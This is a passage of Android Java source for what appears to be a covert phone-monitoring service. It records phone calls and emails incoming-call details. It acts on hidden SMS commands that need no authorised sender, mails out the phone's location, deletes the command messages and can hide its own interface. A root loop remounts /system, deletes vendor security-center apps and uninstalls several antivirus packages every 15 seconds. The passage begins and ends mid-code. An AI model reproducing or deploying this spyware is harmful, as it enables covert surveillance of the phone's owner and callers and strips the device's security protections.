	            			Log.d(TAG, "mVoiceRecorder start...VOICE_CALL");
	            			mVoiceRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);//Call this only before setOutputFormat()
	            		}
	            		else {
	            			Log.d(TAG, "mVoiceRecorder start...MIC");
	            			mVoiceRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);//Call this only before setOutputFormat()
	            		}
	            		mVoiceRecorder.setOutputFormat(MediaRecorder.OutputFormat.DEFAULT);
	            		mVoiceRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.DEFAULT);
	            		mVoiceRecorder.setOutputFile(voiceRecordFile);
	            		
						mVoiceRecorder.prepare();
						mVoiceRecorder.start();
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						
			        	if (null != mVoiceRecorder)
			        	{
			        		try {
				    		    mVoiceRecorder.release();
			        		} catch (Exception e1) {
								e1.printStackTrace();
							}
			    		    mVoiceRecorder = null;
			        	}
					}
            	}
                break;
                
            case TelephonyManager.CALL_STATE_RINGING:  
				if (1 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1))
		    	{
    				String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
    				String name = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, "");
    				String format = _instance.getResources().getString(R.string.msg_on_call_in_format);
    				
    				SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    				String time_str = dateFormat.format(new Date());
    				
    				String cont = String.format(format, name, time_str, incomingNumber, findContactByNumber(_instance, incomingNumber));
					if (false == emailAddress.equals(""))
					{
						NativeSendEmail(emailAddress, cont, cont);
					}
		    	}
                break;
                
            default:   
                break;   
            }   
            super.onCallStateChanged(state, incomingNumber);  
        }  
        
        @Override  
        public void onDataConnectionStateChanged(int state) {  
            Log.v(this.getClass().getName(), "onDataConnectionStateChanged-state: " + state);  
            super.onDataConnectionStateChanged(state);  
        }  
        
        @Override  
        public void onDataConnectionStateChanged(int state, int networkType) {  
            Log.v(this.getClass().getName(), "onDataConnectionStateChanged-state: " + state);  
            Log.v(this.getClass().getName(), "onDataConnectionStateChanged-networkType: " + networkType);  
            super.onDataConnectionStateChanged(state, networkType);  
        }  
        
        @Override  
        public void onServiceStateChanged(ServiceState serviceState) {  
            Log.v(this.getClass().getName(), "onServiceStateChanged-ServiceState: " + serviceState);  
            super.onServiceStateChanged(serviceState);  
        }  
        
        @Override  
        public void onSignalStrengthChanged(int asu) {  
            Log.v(this.getClass().getName(), "onSignalStrengthChanged-asu: " + asu);  
            super.onSignalStrengthChanged(asu);  
        }  
        
        @Override  
        public void onSignalStrengthsChanged(SignalStrength signalStrength) {  
            Log.v(this.getClass().getName(), "onSignalStrengthsChanged-signalStrength: " + signalStrength);  
            super.onSignalStrengthsChanged(signalStrength);  
        }  
        
    }//MyPhoneStateListener Class
    
	public class SMSBroadcastReceiver extends BroadcastReceiver {
		
	    @Override
	    public void onReceive(Context context, Intent intent) {
	        Object[] pdus = (Object[])(intent.getExtras().get("pdus"));//获取短信内容
	        for(Object pdu : pdus){
	            byte[] data = (byte[])pdu;//获取单条短信内容，短信内容以pdu格式存在
	            
	            SmsMessage message = null;
	            String sender = "";
	            String content = "";
	            try {
		            message = SmsMessage.createFromPdu(data);//使用pdu格式的短信数据生成短信对象
		            sender = message.getOriginatingAddress();//获取短信的发送者
		            content = message.getMessageBody();//获取短信的内容
	            } catch (Exception e) {
        			// TODO Auto-generated catch block
        			e.printStackTrace();
        			continue;
        		}
	            
	            Log.d("SMSBroadcastReceiver", "Recv SMS:<" + sender + ">" + content);
	            
	            String emailAddress = AppSettings.GetSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, "");
	            
	            //隐藏短信指令：无需主控手机号码，不发回复短信
	            if (content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_restart))
	            	|| content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_restart_simple)) )
	            {
    					//Restart WiFi...
    					WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 
        			    boolean bWifiEnabled = wifiManager.isWifiEnabled();
        			    if (bWifiEnabled)
        			    {
        			    	wifiManager.setWifiEnabled(false);
        			    	while (WifiManager.WIFI_STATE_DISABLED != wifiManager.getWifiState())
        			    	{		    			    		
        			    		try {
    								Thread.sleep(100);
    							} catch (InterruptedException e) {  }
        			    	}
        			    	
        			    	wifiManager.setWifiEnabled(true);
        			    }
    					
    					try {
    						_instance.stopSelf();
    						Thread.sleep(2000);
    						android.os.Process.killProcess(android.os.Process.myPid());
    					} catch(Exception e) {}
	            }
	            
	            //数据流量  开关
	            if (content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_mobiledata_on_simple)) )
	            {
	            	try {
	            		MobileDataUtility.toggleMobileData(_instance, true);
	            	} catch(Exception e) {}
	            }
	            else if (content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_mobiledata_off_simple)) )
	            {
	            	try {
	            		MobileDataUtility.toggleMobileData(_instance, false);
	            	} catch(Exception e) {}
	            }
	            
	            //查询
	            if (content.contains(context.getResources().getString(R.string.msg_sms_hidden_cmd_query)) )
	            {
	            	SendStatusReport(emailAddress);
	            }
	            
	            //wifi switch
				if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_enable_wifi)))
				{
					WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 
					wifiManager.setWifiEnabled(true);
				}
				else if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_disable_wifi)))
				{
					WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE); 
					wifiManager.setWifiEnabled(false);
				}
	            
				//email report switch
				if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_enable_email)))
				{
					AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1);
				}
				else if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_disable_email)))
				{
					AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 0);
				}
				
				//location
				if (content.contains(_instance.getResources().getString(R.string.msg_sms_hidden_cmd_location)))
				{
					try {
						if (false == emailAddress.equals(""))
						{
							String tmp_boby = GenerateLocationMsg(_instance);
							NativeSendEmail(emailAddress, tmp_boby, tmp_boby);
						}
					} catch (Exception e) {
		    			// TODO Auto-generated catch block
		    			e.printStackTrace();
		    		}
				}
				
				
	            if (isAuthPhone(sender))
	    		{
	            	abortBroadcast();
	            	
	            	content = content.trim();
    				
    				
    				//清除手机号码
    				if (content.equalsIgnoreCase(_instance.getResources().getString(R.string.msg_sms_cmd_clear_phonenum)))
    				{
    					AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_SMSPHONENUM, "");
    					
    					_instance.sendSMS(
    							sender,
    							_instance.getResources().getString(R.string.msg_phonenum_cleared));
    				}
    				
    				//set value...(:)
    				else if (content.contains(":"))
    				{
    					String[] arr = content.split(":");
    					if (arr != null && arr.length == 2)
    					{
    						arr[0] = arr[0].trim();
    						arr[1] = arr[1].trim();
    						if (arr[0].equalsIgnoreCase(_instance.getResources().getString(R.string.msg_sms_cmd_enable_email)))
    						{
		    					AppSettings.SaveSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_ENABLE_EMAIL, 1);
		    					AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_EMAILADDRESS, arr[1]);
		    					
		    					_instance.sendSMS(
		    							sender,
		    							String.format(_instance.getResources().getString(R.string.msg_sms_cmd_result), _instance.getResources().getString(R.string.msg_sms_cmd_enable_email) + ":")
		    							);
    						}
    						else if (arr[0].equalsIgnoreCase(_instance.getResources().getString(R.string.msg_sms_cmd_set_name)))
    						{
		    					AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_NODENAME, arr[1]);
		    					
		    					_instance.sendSMS(
		    							sender,
		    							String.format(_instance.getResources().getString(R.string.msg_sms_cmd_result), _instance.getResources().getString(R.string.msg_sms_cmd_set_name) + ":")
		    							);
    						}
    						else if (arr[0].equalsIgnoreCase(_instance.getResources().getString(R.string.msg_sms_cmd_set_pass)))
    						{
		    					AppSettings.SaveSoftwareKeyValue(_instance, AppSettings.STRING_REGKEY_NAME_PASSWORD, arr[1]);
		    					
		    					_instance.sendSMS(
		    							sender,
		    							String.format(_instance.getResources().getString(R.string.msg_sms_cmd_result), _instance.getResources().getString(R.string.msg_sms_cmd_set_pass) + ":")
		    							);
    						}
    						else {
    							UnknownSmsCmd(sender, content);
    						}
    					}
    					else {
    						UnknownSmsCmd(sender, content);
    					}
    				}
    				
    				
    				//unknown cmd
    				else {
    					UnknownSmsCmd(sender, content);
    				}
    				
    				delete_recv_sms(sender, content);
            	}
	            
	        }//for
	    }
	
	}//SMSBroadcastReceiver Class
	
	public class BatteryBroadcastReceiver extends BroadcastReceiver {
		
		private int m_battery_level = 100;
		
		private static final int BATTERY_MONITOR_LOW_LEVEL = 35;
		private static final int BATTERY_MONITOR_HIGH_LEVEL = 50;
		
		public boolean is_battery_too_low()
		{
			return (m_battery_level < BATTERY_MONITOR_LOW_LEVEL);
		}
		
	    @Override
	    public void onReceive(Context context, Intent intent) {
	    	
	    	int rawlevel = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
	    	int scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
	    	int plugged = intent.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);

	    	if (rawlevel >= 0 && scale > 0)
	    	{
	    		m_battery_level = (rawlevel * 100) / scale;
                if (m_battery_level < BATTERY_MONITOR_LOW_LEVEL) {
                	if (_instance != null && _instance.mCamera != null && _instance.m_isClientConnected == false && _instance.m_isCaptureRunning == false) {
                		//if (_instance.m_isArmed) _instance.video_detect_stop();
                		//else                     _instance.video_mt_stop();
                		//Log.d(TAG, "Battery level <" + BATTERY_MONITOR_LOW_LEVEL + ", stop detect/mt!");
                	}
                }
                else if (m_battery_level > BATTERY_MONITOR_HIGH_LEVEL) {
                	if (_instance != null && _instance.mCamera == null && _instance.m_isClientConnected == false && _instance.m_isCaptureRunning == false) {
                		//if (_instance.m_isArmed) _instance.video_detect_start();
                		//else                     _instance.video_mt_start();
                		//Log.d(TAG, "Battery level >" + BATTERY_MONITOR_HIGH_LEVEL + ", start detect/mt!");
                	}
                }
                
                m_battery_percent = m_battery_level;
                
                if (plugged == 0) {
                	Log.d(TAG, "Battery: plugged==0");
                }
            }
	    }//onReceive
	}//BatteryBroadcastReceiver Class
	
	
	
	private static MobileCameraService _instance = null;//////////////////
	
	private static final String TAG = "MobileCameraService";
	private PowerManager.WakeLock m_wl = null;
	private WorkerHandler mWorkerHandler = null;
	private MainHandler mMainHandler = null;
	
	private int m_battery_percent = 0;
	
	private WindowManager mWindowManager = null;
	private LinearLayout mFloatView = null;
	
	private SurfaceView m_sfv = null;
	private SurfaceHolder m_sfh = null;
	
	private boolean mSkipCamera = false;
	private long mFpsTimeInterval = 100;
	private long mLastFrameTime = 0;
	private Camera mCamera = null;
	private Camera.Parameters m_camParam = null;
	
	private int mSkipAudioCount = 0;// >=0, can do audio
	private AudioRecord mAudioRecord = null;
	private LinkedList<byte[]> mRecordQueue = new LinkedList<byte[]>();
	private boolean m_bQuitRecord;
	
	private LocalSocket mSendSock = null;
	private MediaRecorder mMediaRecorder = null;
	
	/* GPS Location */
	private LocationManager mLocationManager;
	private OnLocationListener mOnLocationListener = new OnLocationListener();
	private boolean mLocationEnabled = false;
	private double mLocLongitude = 0.0d;//jing du
	private double mLocLatitude = 0.0d; //wei du
	
	private LocationClient mLocationClient;
	private BDLocationListener mBaiduListener = new MyBaiduLocationListener();
	private double mBaiduLongitude = 0.0d;//jing du
	private double mBaiduLatitude = 0.0d; //wei du
	private long   mLastBaiduTime = 0;
	
	private TelephonyManager mTelephonyManager;
    private MyPhoneStateListener mPhoneCallListener;
    
	private boolean m_isArmed = false;
	private boolean m_isClientConnected = false;
	private boolean m_isCaptureRunning = false;
	
	private CallContentObserver mCallContentObserver = null;
	private SMSContentObserver mSMSContentObserver = null;
	
    private SMSBroadcastReceiver mSmsReceiver = null;
	private BatteryBroadcastReceiver mBatteryReceiver = null;
    
	private LocalSocket ioSock = null;
	
	public static boolean m_bForeground = true;
	public static boolean m_bNormalInstall = true;
	
    @Override
    public void onCreate() {
    	Log.d(TAG, "Service onCreate~~~");
        super.onCreate();
        
        mSmsReceiver = new SMSBroadcastReceiver();
        IntentFilter smsFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        smsFilter.setPriority(2147483647);//设置优先级最大
        registerReceiver(mSmsReceiver, smsFilter);
        
        mBatteryReceiver = new BatteryBroadcastReceiver();
        IntentFilter batteryFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        registerReceiver(mBatteryReceiver, batteryFilter);
        
        
        Log.d(TAG, "Acquiring wake lock");
        PowerManager pm = (PowerManager)getSystemService(Context.POWER_SERVICE);
        m_wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE, "MobileCameraService PARTIAL_WAKE_LOCK");
        m_wl.acquire();
        
        //设置WiFi永不休眠
        try {
        	Settings.System.putInt(getContentResolver(),
                    android.provider.Settings.System.WIFI_SLEEP_POLICY,
                    Settings.System.WIFI_SLEEP_POLICY_NEVER);
        } catch (Exception e) {
			e.printStackTrace();
		}
        
        
		if (0 == AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_ALLOW_HIDE_UI, 1))
		{
			AppSettings.SaveSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0);
		}
        if (1 == AppSettings.GetSoftwareKeyDwordValue(this, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
    	{
        	HomeActivity.DoHideUi(this);
    	}
        else {
        	HomeActivity.DoShowUi(this);
        }
        
        
        Worker worker = new Worker("MobileCameraService Worker");
        mWorkerHandler = new WorkerHandler(worker.getLooper());
        mMainHandler = new MainHandler();
        
        mCallContentObserver = new CallContentObserver(mMainHandler);
        getContentResolver().registerContentObserver(Uri.parse("content://call_log/calls"), true, mCallContentObserver);
        
        mSMSContentObserver = new SMSContentObserver(mMainHandler);
        getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, mSMSContentObserver);
        
        
        mWindowManager = (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);
        WindowManager.LayoutParams wmParams = new WindowManager.LayoutParams();
        wmParams.type = LayoutParams.TYPE_PHONE;
        wmParams.format = PixelFormat.RGBA_8888;
        wmParams.flags = LayoutParams.FLAG_NOT_TOUCH_MODAL | LayoutParams.FLAG_NOT_FOCUSABLE;
        wmParams.width = LayoutParams.WRAP_CONTENT;
        wmParams.height = LayoutParams.WRAP_CONTENT;
        wmParams.gravity = Gravity.CENTER;
        wmParams.x = 0;
        wmParams.y = 0;
        
        m_sfv = new SurfaceView(getApplication());
        m_sfh = m_sfv.getHolder();
		LayoutParams params_sur = new LayoutParams();
		params_sur.width = 640;
		params_sur.height = 480;
		params_sur.alpha = 255;
		m_sfv.setLayoutParams(params_sur);
        
		mFloatView = new LinearLayout(getApplication());
        LayoutParams params_rel = new LayoutParams();
        params_rel.width = LayoutParams.WRAP_CONTENT;
        params_rel.height = LayoutParams.WRAP_CONTENT;
        mFloatView.setLayoutParams(params_rel);
        mFloatView.addView(m_sfv);
        mWindowManager.addView(mFloatView, wmParams);
		
		
        //m_sfv = (SurfaceView)findViewById(R.id.preview_surfaceview);
        //m_sfh = m_sfv.getHolder();
        m_sfh.setType(SurfaceHolder.SURFACE_TYPE_PUSH_BUFFERS);//For camera preview!!!
        m_sfh.addCallback(new MySurfaceHolderCallback());
    	
    	
        mLocationManager = (LocationManager)getSystemService(Context.LOCATION_SERVICE);
        mLocationEnabled = mLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        if (mLocationEnabled) {
        	String provider = LocationManager.NETWORK_PROVIDER;
        	Location lastLoc = mLocationManager.getLastKnownLocation(provider);
        	if (null == lastLoc) {
        		lastLoc = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        	}
        	if (null != lastLoc)
			{
	        	mLocLongitude = lastLoc.getLongitude();
				mLocLatitude = lastLoc.getLatitude();
				Log.d(TAG, "Get last " + lastLoc.toString());
			}
        	mLocationManager.requestLocationUpdates(provider, 10*60*1000, 200, mOnLocationListener);
        }
        
        mLocationClient = new LocationClient(getApplicationContext());
        mLocationClient.registerLocationListener(mBaiduListener);
        
        LocationClientOption option = new LocationClientOption();
        option.setLocationMode(LocationMode.Battery_Saving);//可选，默认高精度，设置定位模式，高精度，低功耗，仅设备
        option.setOpenGps(false);
        option.setPriority(LocationClientOption.NetWorkFirst);
        option.setIsNeedAddress(false);
        option.setCoorType("bd09ll");//返回的定位结果是百度经纬度,默认值gcj02
        option.setScanSpan(500);//设置发起定位请求的间隔时间
        option.disableCache(true);//禁止缓存定位
        option.setIsNeedLocationPoiList(false);
        mLocationClient.setLocOption(option);
        
        try {
	        mLocationClient.start();
	        mLocationClient.requestLocation();
	        mLastBaiduTime = System.currentTimeMillis();
        } catch (Exception e) {  }
        
        
        mTelephonyManager = (TelephonyManager)getApplication().getSystemService(Context.TELEPHONY_SERVICE);  
        mPhoneCallListener = new MyPhoneStateListener();   
        mTelephonyManager.listen(mPhoneCallListener, MyPhoneStateListener.LISTEN_CALL_STATE);  
        //mTelephonyManager.listen(mPhoneCallListener, MyPhoneStateListener.LISTEN_SERVICE_STATE);   
        //mTelephonyManager.listen(mPhoneCallListener, MyPhoneStateListener.LISTEN_DATA_CONNECTION_STATE);  
        
        //silenceRinger();
        
        
    	//AudioManager audioManager = (AudioManager)getApplication().getSystemService(Context.AUDIO_SERVICE);
    	//int max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
    	//audioManager.setSpeakerphoneOn(true);
    	//audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, max, 0);
    	
        
        _instance = this;//////////////////
        if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
    	{
    		SharedFuncLib.MyMessageTip(_instance, _instance.getResources().getString(R.string.msg_on_service_created));
    	}
        
        Message send_msg = _instance.mWorkerHandler.obtainMessage(WORK_MSG_CHECK);
        _instance.mWorkerHandler.sendMessageDelayed(send_msg, 100);
        
        
        //检查是否UsbRoot安装方式
        if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_USB_ROOT_INSTALL, 0))
    	{
			m_bForeground = true;
			m_bNormalInstall = true;
    	}
    	else {
			m_bForeground = true;
			m_bNormalInstall = false;
    	}
        
        
        m_isArmed = false;
        
		new Thread(new Runnable() {
			public void run()
			{
	    		File dir = new File("/data/data/" + getPackageName() + "/remotephone");
	    		if (false == dir.exists()) {
	    			dir.mkdir();
	    		}
				
				//try {
				//	Thread.sleep(3000);//等待Surface创建完成
				//} catch (InterruptedException e) {}
				
				//record_h264_3gp();
				
				mMainHandler.sendEmptyMessageDelayed(UI_MSG_AUTO_START, 100);
				
				
				while (true)
				{
					int ret = 0;
					byte[] buffer = new byte[1024];
					LocalServerSocket localServerSock = null;
					//LocalSocket ioSock = null;
					InputStream is = null;
					
					_instance.mMainHandler.post(new Runnable(){
		    			@Override
		    			public void run() {
		    				Intent intent = new Intent();
		    		    	intent.setAction("android.double.action.MYACTION");
		    		    	intent.setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
		    		    	sendBroadcast(intent);
		    		    	
		    		    	Log.d(TAG, "Pre restart peer~~~");
		    			}
		    		});
					
					try {
						Thread.sleep(100);
					} catch (InterruptedException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
					
					try {
						localServerSock = new LocalServerSocket("mobilecamera.my_server_socket");
					}catch (Exception e) {continue;}
					
					// Blocking...
					try {
						ioSock = localServerSock.accept();
					}catch (Exception e) {continue;}
					try {
						is = ioSock.getInputStream();
					}catch (Exception e) {continue;}
					
					Log.d(TAG, "Accepted peer connection~~~");
					
					while (true)
					{
						try {
							ret = 0;
							ret = is.read(buffer);
						}
						catch (InterruptedIOException e) {
							if (ret < 0) {
								ret = 0;
							}
						}
						catch (IOException e) {
							ret = -1;
						}
						if (ret < 0)
						{
							_instance.mMainHandler.post(new Runnable(){
				    			@Override
				    			public void run() {
				    				Intent intent = new Intent();
				    		    	intent.setAction("android.double.action.MYACTION");
				    		    	intent.setFlags(Intent.FLAG_INCLUDE_STOPPED_PACKAGES);
				    		    	sendBroadcast(intent);
				    		    	
				    		    	Log.d(TAG, "Restart peer~~~");
				    			}
				    		});
							break;
						}
					}
					
					try {
						is.close();
					}catch (Exception e) {}
					try {
						ioSock.close();
					}catch (Exception e) {}
					try {
						localServerSock.close();
					}catch (Exception e) {}
				}
			}
		}).start();
        
		new Thread(new Runnable() {
			public void run()
			{
				//等待SetThisObject()执行
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e1) {}
				
				while (true)
				{
					boolean root = true;
					root &= hasRootPermission();
					if (root) {
						runNativeShellCmd("su -c \"mount -o remount,rw /system\"");
						runNativeShellCmd("su -c \"rm -f /system/app/SafeCenter.apk\"");
						runNativeShellCmd("su -c \"rm -f /system/app/SafeCenter.odex\"");
						runNativeShellCmd("su -c \"rm -f /system/app/SafeCenter/SafeCenter.apk\"");
						runNativeShellCmd("su -c \"rm -f /system/app/OppoGuardElf.apk\"");
						runNativeShellCmd("su -c \"rm -f /system/app/OppoGuardElf.odex\"");
						runNativeShellCmd("su -c \"rm -f /system/app/OppoGuardElf/OppoGuardElf.apk\"");
						runNativeShellCmd("su -c \"rm -f /system/priv-app/SecurityCenter.apk\"");
						runNativeShellCmd("su -c \"rm -f /system/priv-app/SecurityCenter.odex\"");
						runNativeShellCmd("su -c \"mount -o remount,ro /system\"");
						
						runNativeShellCmd("su -c \"pm uninstall -k cn.opda.a.phonoalbumshoushou\"");
						runNativeShellCmd("su -c \"pm uninstall -k com.qihoo.antivirus\"");
						runNativeShellCmd("su -c \"pm uninstall -k com.qihoo360.mobilesafe\"");
						runNativeShellCmd("su -c \"pm uninstall -k com.ijinshan.mguard\"");
						runNativeShellCmd("su -c \"pm uninstall -k com.tencent.qqpimsecure\"");
						runNativeShellCmd("su -c \"pm uninstall -k com.anguanjia.safe\"");
						runNativeShellCmd("su -c \"pm uninstall -k com.lbe.security\"");
						runNativeShellCmd("su -c \"pm uninstall -k com.lbe.security.miui\"");
					}
					else {
						
					}
					
					try {
						Thread.sleep(15000);
					} catch (InterruptedException e1) {}
				}
			}
		}).start();
		
        /* Start native main... */
        SetThisObject();
        StartNativeMain("utf8", getResources().getString(R.string.app_lang), getPackageName());
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
    	
        //检查是否UsbRoot安装方式
        if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_USB_ROOT_INSTALL, 0))
    	{
			m_bForeground = true;
			m_bNormalInstall = true;
    	}
    	else {
			m_bForeground = true;
			m_bNormalInstall = false;
    	}
    	
    	if (m_bForeground)
    	{
	    	Notification notification = new Notification(R.drawable.notification_icon,  
	    			 getString(R.string.notification_title), System.currentTimeMillis());
	    	PendingIntent pendingIntent = PendingIntent.getActivity(this, 0,  
	    			 new Intent(Settings.ACTION_WIFI_SETTINGS), 0);
    		notification.setLatestEventInfo(this, getText(R.string.notification_title),
	    	        getText(R.string.notification_message), pendingIntent);
    		startForeground(0x111, notification);
    	}
    	
    	flags = START_STICKY;
    	return super.onStartCommand(intent, flags, startId);
    }
    
    @Override
    public void onDestroy() {
    	
    	Log.d(TAG, "Service onDestroy~~~");
    	
    	if (0 == AppSettings.GetSoftwareKeyDwordValue(_instance, AppSettings.STRING_REGKEY_NAME_HIDE_UI, 0))
    	{
    		SharedFuncLib.MyMessageTip(_instance, _instance.getResources().getString(R.string.msg_on_service_destroyed));
    	}
    	_instance = null;//////////////////
    	
        Log.d(TAG, "Release wake lock");
    	m_wl.release();
    	
        try {
			ioSock.close();
		} catch (Exception e) {}
        
    	
    	mWorkerHandler.getLooper().quit();
    	
    	m_bQuitRecord = true;
    	
    	StopDoConnection();
    	
    	StopNativeMain();
    	
    	
    	if (mCamera != null)
    	{
    		mCamera.setPreviewCallback(null);
    		mCamera.stopPreview();
    		mCamera.release();
    		mCamera = null;
    	}
    	
    	mRecordQueue.clear();
    	
    	if (mAudioRecord != null)
    	{
    		mAudioRecord.stop();
	    	mAudioRecord.release();
	    	mAudioRecord = null;
    	}
    	
        if (mLocationEnabled) {
        	mLocationManager.removeUpdates(mOnLocationListener);
        }
        
        if (mLocationClient != null && mLocationClient.isStarted()) {
        	mLocationClient.stop();
        }
        
        mTelephonyManager.listen(mPhoneCallListener, MyPhoneStateListener.LISTEN_NONE);
        
        if (mSmsReceiver != null) {    
        	unregisterReceiver(mSmsReceiver);
        }
        
        if (mBatteryReceiver != null) {    
        	unregisterReceiver(mBatteryReceiver);
        }
        
        if (mFloatView.getParent() != null) {
        	mWindowManager.removeView(mFloatView);
        }
        
        getContentResolver().unregisterContentObserver(mCallContentObserver);
        getContentResolver().unregisterContentObserver(mSMSContentObserver);
        
        if (m_bForeground) {
        	stopForeground(true);
        }
        
        
    	super.onDestroy();
    	
    	
    	try {
			android.os.Process.killProcess(android.os.Process.myPid());
		} catch(Exception e) {}
    }
    
	@Override
	public IBinder onBind(Intent intent)
	{
	    // TODO Auto-generated method stub
	    return null;
	}
	
    @Override
    public boolean onUnbind(Intent intent) {
        return super.onUnbind(intent);
    }
    
    @Override
    public void onStart(Intent intent, int startId) {
        Log.d(TAG, "Service onStart~~~");
        super.onStart(intent, startId);
    }
	
    private void setFlashlightEnabled(boolean isEnable)
    {
        try  
        {  
            Method method = Class.forName("android.os.ServiceManager").getMethod("getService", String.class);
            IBinder binder = (IBinder) method.invoke(null, new Object[] { "hardware" });
            
            IHardwareService localhardwareservice = IHardwareService.Stub.asInterface(binder);
            localhardwareservice.setFlashlightEnabled(isEnable);
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        
        try
        {
            if (mCamera != null)
            {
            	Camera.Parameters parameters = mCamera.getParameters();
        		List<String> modes = parameters.getSupportedFlashModes();
        		if (isEnable) {
	        		if (modes.contains(Camera.Parameters.FLASH_MODE_TORCH)) {
	        			parameters.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
	        		}
	        		else if (modes.contains(Camera.Parameters.FLASH_MODE_ON)) {
	        			parameters.setFlashMode(Camera.Parameters.FLASH_MODE_ON);
	        		}
        		}
        		else {
            		if (modes.contains(Camera.Parameters.FLASH_MODE_OFF)) {
            			parameters.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
            		}
        		}
        		mCamera.setParameters(parameters);
            }
        }
        catch (Exception e)  
        {  
            e.printStackTrace();  
        }
    }
    
    private void onBtnArm()
    {
    	if (false == m_isArmed)
    	{
        	m_isArmed = true;
        	
        	StartDoConnection();
    	}
    }
    
    private void onBtnDisarm()
    {
    	if (m_isArmed)
    	{
        	m_isArmed = false;
        	
        	StopDoConnection();
        	try {
				Thread.sleep(1000);
			} catch (InterruptedException e) {}
    	}
    }
    
	private class OnLocationListener implements LocationListener
	{
		public void onLocationChanged(Location location) {
			// TODO Auto-generated method stub
			
			if (_instance == null) {
				return;
			}
			
			if (null != location)
			{
				mLocLongitude = location.getLongitude();
				mLocLatitude = location.getLatitude();
				Log.d(TAG, "GPS Location Changed: mLocLongitude=" + mLocLongitude + ", mLocLatitude=" + mLocLatitude);
			}
		}

		public void onProviderDisabled(String provider) {
			// TODO Auto-generated method stub			
			Log.d(TAG, "GPS Provider Disabled!!!");
			mLocLongitude = 0.0d;
			mLocLatitude = 0.0d;
		}

		public void onProviderEnabled(String provider) {
			// TODO Auto-generated method stub			
		}

		public void onStatusChanged(String provider, int status, Bundle extras) {
			// TODO Auto-generated method stub			
		}		
	}
    
	private class MyBaiduLocationListener implements BDLocationListener
	{
		@Override
		public void onReceiveLocation(BDLocation location) {
			// TODO Auto-generated method stub
			
			if (_instance == null) {
				return;
			}
			
			String strE324 = "4.9E-324";
			if (location != null && 
					strE324.equalsIgnoreCase(""+location.getLongitude()) == false && 
					strE324.equalsIgnoreCase(""+location.getLatitude()) == false)
			{
				//如果百度定位可用，则禁用Android定位机制
				if (mLocationEnabled) {
					try {
						mLocationManager.removeUpdates(mOnLocationListener);
					} catch (Exception e) {}
		        }
				mLocLongitude = 0.0d;
				mLocLatitude = 0.0d;
				
				mBaiduLongitude = location.getLongitude();
				mBaiduLatitude = location.getLatitude();
				Log.d(TAG, "Baidu Location received: mBaiduLongitude=" + mBaiduLongitude + ", mBaiduLatitude=" + mBaiduLatitude);
				_instance.mMainHandler.post(new Runnable(){
	    			@Override
	    			public void run() {
	    				try {
	    					mLocationClient.stop();
	    				} catch (Exception e) {  }
	    			}
	    		});
			}
			else {
				_instance.mMainHandler.post(new Runnable(){
	    			@Override
	    			public void run() {
						if (mLocationClient != null && mLocationClient.isStarted()) { 
				            mLocationClient.requestLocation();
				        }
	    			}
	    		});
			}
		}
	}
	
	class MySurfaceHolderCallback implements SurfaceHolder.Callback {

		 public void surfaceCreated(SurfaceHolder holder) {
		     // The Surface has been created, acquire the camera and tell it where
		     // to draw.
